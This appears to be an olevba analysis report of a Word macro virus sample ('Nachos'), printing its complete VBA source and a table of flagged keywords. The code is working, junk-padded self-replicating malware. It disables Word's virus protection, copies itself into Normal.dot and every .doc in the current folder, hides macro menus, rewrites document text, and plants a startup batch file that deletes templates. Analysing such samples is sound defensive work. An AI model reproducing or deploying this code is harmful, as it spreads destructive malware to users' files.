olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-5de1d005face75049b30a07165ce18242875719e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-5de1d005face75049b30a07165ce18242875719e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Nachos.bas 
in file: Virus.MSWord.VMPC-based-5de1d005face75049b30a07165ce18242875719e - OLE stream: 'Macros/VBA/Nachos'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
    
    
Sub Nachos()
On Error Resume Next
Randomize
f10339 = m7637 & c10571 & Int(Rnd * 366)
f10843 = u9920 & c8584 & k10807 & m9920
f10843 = m9920 & c8584 & Int(Rnd * 2291)
k16404 = m4419 & e10526
f14188 = m4419 & c12742 & Int(Rnd * 1705)
f9104 = u15816 & c6352 & Int(Rnd * 5330)
f9104 = m15816 & c6352 & Int(Rnd * 6459)
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Application.VBE.ActiveVBProject.VBComponents("Nachos").Export "c:\Nachos.sys"
f5880 = u9684 & c13427 & Int(Rnd * 6366)
f5880 = m9684 & c13427 & Int(Rnd * 4142)
k17931 = m12051 & e10187
f10034 = m12051 & c18084 & Int(Rnd * 2923)
k11027 = m13933 & e762
f9570 = m13933 & c2219 & Int(Rnd * 9690)
ActiveDocument.ReadOnlyRecommended = False
f7724 = u6809 & c17822 & Int(Rnd * 6539)
f7724 = m6809 & c17822 & Int(Rnd * 1917)
f12973 = m12615 & c6994 & Int(Rnd * 7653)
f16271 = u8274 & c9606 & k9059 & m8274
f16271 = m8274 & c9606 & Int(Rnd * 3672)
f11997 = u17541 & c13714 & Int(Rnd * 5715)
f11997 = m17541 & c13714 & Int(Rnd * 7794)
f13391 = u11893 & c11315 & k10368 & m11893
f13391 = m11893 & c11315 & Int(Rnd * 7490)
check = Int(Rnd * 1000)
If check = 3 Then Call pNacho
k12717 = m3269 & e10708
f18925 = m3269 & c4500 & Int(Rnd * 815)
f11367 = u12220 & c5068 & Int(Rnd * 6)
f11367 = m12220 & c5068 & Int(Rnd * 4071)
k2279 = m15241 & e6427
f1475 = m15241 & c7231 & Int(Rnd * 6014)
f6106 = u11070 & c6826 & Int(Rnd * 4694)
f6106 = m11070 & c6826 & Int(Rnd * 3181)
rm = Int(Rnd * 100)
    If rm = 99 Then MsgBox "Nacho's", vbSystemModal
f13736 = u11645 & c15945 & k16336 & m11645
f13736 = m11645 & c15945 & Int(Rnd * 3626)
f3511 = u10259 & c12548 & Int(Rnd * 2035)
f3511 = m10259 & c12548 & Int(Rnd * 4587)
f9808 = m10664 & c4687 & Int(Rnd * 3884)
f15866 = u14339 & c4357 & Int(Rnd * 3378)
f15866 = m14339 & c4357 & Int(Rnd * 8988)
With Dialogs(wdDialogFileSummaryInfo)
    .Author = "Sir Nacho's"
    .Title = "Nacho's"
    .Subject = "Extra Nacho cheese"
    .Comments = "Elementary my dear nacho's"
    .Keywords = "Nacho's"
    .Execute
End With
f13783 = u10483 & c7493 & Int(Rnd * 4798)
f13783 = m10483 & c7493 & Int(Rnd * 7020)
f12701 = m12389 & c2051 & Int(Rnd * 5219)
f3379 = u6549 & c2244 & k3529 & m6549
f3379 = m6549 & c2244 & Int(Rnd * 2337)
f4487 = u5332 & c15828 & Int(Rnd * 2848)
f4487 = m5332 & c15828 & Int(Rnd * 4445)
 f6855$ = "c:\windows\startm~1\programs\startup\msfile.bat"
f12687 = m7046 & c12979 & Int(Rnd * 66)
k9556 = m8613 & e12953
f8938 = m8613 & c13571 & Int(Rnd * 5968)
a59308643 = GetAttr(NormalTemplate.FullName)
k12154 = m10156 & e17392
f15806 = m10156 & c13740 & Int(Rnd * 440)
f10153 = m417 & c9319 & Int(Rnd * 20)
If a59308643 = vbReadOnly And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vNachos(f6855$)
f8640 = u7699 & c10485 & Int(Rnd * 335)
f8640 = m7699 & c10485 & Int(Rnd * 3227)
k4685 = m8928 & e14650
f12223 = m8928 & c7112 & Int(Rnd * 6833)
If a59308643 = vbReadOnly + vbArchive And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vNachos(f6855$)
f7094 = u11487 & c9176 & Int(Rnd * 1670)
f7094 = m11487 & c9176 & Int(Rnd * 8193)
f2868 = u9593 & c4831 & Int(Rnd * 1003)
f2868 = m9593 & c4831 & Int(Rnd * 5710)
If a59308643 = vbReadOnly Then GoTo Nachosr
k10835 = m6076 & e14546
f13450 = m6076 & c11931 & Int(Rnd * 6038)
f14366 = u16966 & c4594 & k7808 & m16966
f14366 = m16966 & c4594 & Int(Rnd * 7349)
If a59308643 = vbReadOnly + vbArchive Then GoTo Nachosr
f13617 = u13279 & c4713 & Int(Rnd * 1692)
f13617 = m13279 & c4713 & Int(Rnd * 6529)
f12628 = u2864 & c2362 & Int(Rnd * 1425)
f12628 = m2864 & c2362 & Int(Rnd * 1518)
f13498 = u14914 & c13477 & Int(Rnd * 5872)
f13498 = m14914 & c13477 & Int(Rnd * 9433)
k4933 = m9097 & e12719
f3558 = m9097 & c14094 & Int(Rnd * 7981)
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "Nachos" Then nch864322012 = True
Next I
f8998 = u12795 & c4189 & Int(Rnd * 2441)
f8998 = m12795 & c4189 & Int(Rnd * 4516)
f11248 = u13854 & c13833 & Int(Rnd * 9156)
f11248 = m13854 & c13833 & Int(Rnd * 6974)
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "Nachos" Then mmf2201 = True
Next I
f2403 = u11476 & c8964 & k6089 & m11476
f2403 = m11476 & c8964 & Int(Rnd * 2478)
f9796 = u15320 & c15615 & k16060 & m15320
f9796 = m15320 & c15615 & Int(Rnd * 8730)
If nch864322012 = True And mmf2201 = False Then Set y22086437 = NormalTemplate.VBProject.VBComponents
If nch864322012 = False And mmf2201 = True Then Set y22086437 = ActiveDocument.VBProject.VBComponents
y22086437.import "c:\Nachos.sys"
If nch864322012 = True And mmf2201 = False Then Shell ("label c: Nacho's"), 0
If nch864322012 = False And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
f1427 = m6403 & c15684 & Int(Rnd * 2619)
f6915 = m8940 & c7325 & Int(Rnd * 2549)
f8355 = u12129 & c6470 & Int(Rnd * 1409)
f8355 = m12129 & c6470 & Int(Rnd * 5639)
f14890 = u9267 & c11078 & Int(Rnd * 6100)
f14890 = m9267 & c11078 & Int(Rnd * 9129)
k11275 = m4103 & e8829
f10903 = m4103 & c9201 & Int(Rnd * 839)
f9629 = u18116 & c12835 & Int(Rnd * 7311)
f9629 = m18116 & c12835 & Int(Rnd * 8239)
If mmf2201 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
f11354 = m16875 & c15995 & Int(Rnd * 8917)
k8304 = m17304 & e7289
f7034 = m17304 & c8559 & Int(Rnd * 9644)
CommandBars("tools").Controls("Macro").Delete
CommandBars("tools").Controls("Templates and add-ins...").Delete
k7903 = m15895 & e4260
f7426 = m15895 & c4737 & Int(Rnd * 9175)
f9390 = u11385 & c10367 & Int(Rnd * 9472)
f9390 = m11385 & c10367 & Int(Rnd * 4046)
Nachosr:
End Sub
Sub HelpAbout()
    On Error Resume Next
k8964 = m9345 & e13711
f13212 = m9345 & c9463 & Int(Rnd * 1846)
f16224 = u9436 & c8060 & Int(Rnd * 7934)
f16224 = m9436 & c8060 & Int(Rnd * 278)
    MsgBox "Nacho's - 1998 by Virus", vbInformation
k12526 = m15410 & e4496
f12808 = m15410 & c4214 & Int(Rnd * 7162)
f8010 = u12377 & c11838 & Int(Rnd * 5465)
f8010 = m12377 & c11838 & Int(Rnd * 9503)
End Sub
Sub FileNew()
    On Error Resume Next
f2117 = u5907 & c4950 & k588 & m5907
f2117 = m5907 & c4950 & Int(Rnd * 4890)
    Call Nachos
k6557 = m5660 & e15486
f12461 = m5660 & c9582 & Int(Rnd * 1027)
f5236 = u9018 & c15710 & Int(Rnd * 7668)
f5236 = m9018 & c15710 & Int(Rnd * 5265)
Dialogs(wdDialogFileNew).Show
f13676 = m7463 & c15329 & Int(Rnd * 5078)
k6213 = m16560 & e4312
f8069 = m16560 & c2456 & Int(Rnd * 8052)
    Skip = 1
f5747 = u5975 & c13122 & Int(Rnd * 2587)
f5747 = m5975 & c13122 & Int(Rnd * 1892)
k13777 = m6719 & e10160
f14711 = m6719 & c9226 & Int(Rnd * 3485)
    Call Nachos
k11931 = m15684 & e15148
f10875 = m15684 & c16204 & Int(Rnd * 7036)
End Sub
Sub ToolsOptions()
    On Error Resume Next
k7777 = m10352 & e5123
f5555 = m10352 & c7345 & Int(Rnd * 7598)
k16744 = m13057 & e11598
f12375 = m13057 & c15967 & Int(Rnd * 8675)
Dialogs(wdDialogToolsOptions).Show
k6335 = m11187 & e13242
f7531 = m11187 & c12046 & Int(Rnd * 7623)
f10637 = m8954 & c13735 & Int(Rnd * 2844)
    Call Nachos
f7411 = m2822 & c10811 & Int(Rnd * 527)
f11565 = u15188 & c5470 & Int(Rnd * 306)
f11565 = m15188 & c5470 & Int(Rnd * 9307)
End Sub
Sub FileSaveAs()
    On Error Resume Next
f11101 = u7072 & c9602 & Int(Rnd * 8021)
f11101 = m7072 & c9602 & Int(Rnd * 6076)
k6182 = m9947 & e8282
f9257 = m9947 & c5207 & Int(Rnd * 8301)
Dialogs(wdDialogFileSaveAs).Show
f6317 = u9382 & c16297 & Int(Rnd * 5665)
f6317 = m9382 & c16297 & Int(Rnd * 3571)
k8989 = m15042 & e9535
f9614 = m15042 & c8910 & Int(Rnd * 9590)
    Call Nachos
f13530 = m10679 & c11098 & Int(Rnd * 4179)
f14922 = u5031 & c8698 & k16305 & m5031
f14922 = m5031 & c8698 & Int(Rnd * 3875)
End Sub
Sub FileExit()
    On Error Resume Next
f12269 = m10037 & c13803 & Int(Rnd * 6733)
f2900 = m5358 & c2452 & Int(Rnd * 456)
    Call Nachos
f14817 = u2011 & c6535 & Int(Rnd * 5246)
f14817 = m2011 & c6535 & Int(Rnd * 1933)
k10431 = m14207 & e11415
f7637 = m14207 & c14209 & Int(Rnd * 9565)
    If ActiveDocument.Saved = False Then ActiveDocument.Save
k12275 = m4783 & e6324
f5269 = m4783 & c13330 & Int(Rnd * 11)
f15042 = u3397 & c9932 & Int(Rnd * 9763)
f15042 = m3397 & c9932 & Int(Rnd * 972)
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call Nachos
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call Nachos
End If
Loop
    Application.Quit
f11339 = u3803 & c12070 & k8836 & m3803
f11339 = m3803 & c12070 & Int(Rnd * 269)
f9210 = u11108 & c13660 & Int(Rnd * 3413)
f9210 = m11108 & c13660 & Int(Rnd * 4907)
End Sub
Sub AutoOpen()
    On Error Resume Next
f7126 = m7252 & c6797 & Int(Rnd * 2939)
f4233 = m5527 & c9434 & Int(Rnd * 1604)
    Call Nachos
f16720 = u13317 & c11548 & Int(Rnd * 5365)
f16720 = m13317 & c11548 & Int(Rnd * 8255)
k14682 = m8470 & e4549
f6019 = m8470 & c13212 & Int(Rnd * 831)
End Sub
Sub AutoExit()
    On Error Resume Next
f14220 = u10183 & c10363 & k7529 & m10183
f14220 = m10183 & c10363 & Int(Rnd * 6450)
f10471 = u11750 & c10955 & Int(Rnd * 3152)
f10471 = m11750 & c10955 & Int(Rnd * 2353)
    Call Nachos
k12084 = m6925 & e10110
f9150 = m6925 & c13044 & Int(Rnd * 6358)
f11684 = u13554 & c6703 & k14805 & m13554
f11684 = m13554 & c6703 & Int(Rnd * 6404)
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call Nachos
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call Nachos
End If
Loop
End Sub
Sub ViewVBCode()
    On Error Resume Next
f11983 = m14467 & c9789 & Int(Rnd * 9145)
f15566 = u5697 & c6416 & k14614 & m5697
f15566 = m5697 & c6416 & Int(Rnd * 2752)
k14710 = m4626 & e10475
f18625 = m4626 & c6560 & Int(Rnd * 4578)
k8932 = m2732 & e17680
f14398 = m2732 & c12214 & Int(Rnd * 2095)
k6774 = m9214 & e7525
f4984 = m9214 & c9315 & Int(Rnd * 2424)
k13746 = m10104 & e14130
f15899 = m10104 & c11977 & Int(Rnd * 3734)
f15148 = m6418 & c12096 & Int(Rnd * 2915)
End Sub
Sub pNacho()
    On Error Resume Next
k11052 = m9631 & e16584
f15971 = m9631 & c11665 & Int(Rnd * 7435)
k10403 = m8052 & e5488
f5030 = m8052 & c10861 & Int(Rnd * 5818)
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = "the"
            .Replacement.Text = "Nachos"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
f5090 = u12234 & c11479 & Int(Rnd * 6400)
f5090 = m12234 & c11479 & Int(Rnd * 4366)
k5962 = m5933 & e6141
f531 = m5933 & c11572 & Int(Rnd * 901)
End Sub
    
Sub vNachos(strFile As String)
    
Dim hFile As Long
On Error Resume Next
k13182 = m6993 & e10815
f12780 = m6993 & c11217 & Int(Rnd * 3360)
f13934 = u14613 & c16347 & k12026 & m14613
f13934 = m14613 & c16347 & Int(Rnd * 8862)
n$ = NormalTemplate
k5991 = m12089 & e12067
f13138 = m12089 & c4920 & Int(Rnd * 4649)
f12959 = u9541 & c13068 & k14586 & m9541
f12959 = m9541 & c13068 & Int(Rnd * 9004)
Part11$ = "attrib -h -r "
f8448 = u12077 & c4709 & k3308 & m12077
f8448 = m12077 & c4709 & Int(Rnd * 8933)
k7652 = m5268 & e16088
f9887 = m5268 & c13853 & Int(Rnd * 2025)
snag$ = "c:\progra~1\micros~1\templa~1\"
f6423 = m12404 & c8462 & Int(Rnd * 5514)
f2436 = u7241 & c6585 & Int(Rnd * 942)
f2436 = m7241 & c6585 & Int(Rnd * 7224)
snag1$ = "c:\progra~1\micros~2\templa~1\"
k7433 = m11254 & e13947
f11161 = m11254 & c10219 & Int(Rnd * 4624)
f4697 = u13644 & c5301 & Int(Rnd * 3819)
f4697 = m13644 & c5301 & Int(Rnd * 4836)
Part2$ = "del "
f8567 = u10443 & c15941 & Int(Rnd * 2381)
f8567 = m10443 & c15941 & Int(Rnd * 6030)
k7833 = m12664 & e16975
f10768 = m12664 & c14040 & Int(Rnd * 5094)
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, Part11$ + snag$ + n$
Print #hFile, Part11$ + snag1$ + n$
Print #hFile, Part2$ + snag$ + n$
Print #hFile, Part2$ + snag1$ + n$
Print #hFile, "cls"
Print #hFile, Part2$ + "c:\windows\startm~1\programs\startup\msfile.bat"
Close hFile
k9553 = m18153 & e12851
f12733 = m18153 & c9671 & Int(Rnd * 9964)
f4744 = u12482 & c6847 & Int(Rnd * 4832)
f4744 = m12482 & c6847 & Int(Rnd * 8230)
f7756 = m12573 & c5444 & Int(Rnd * 6662)
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |msfile.bat          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

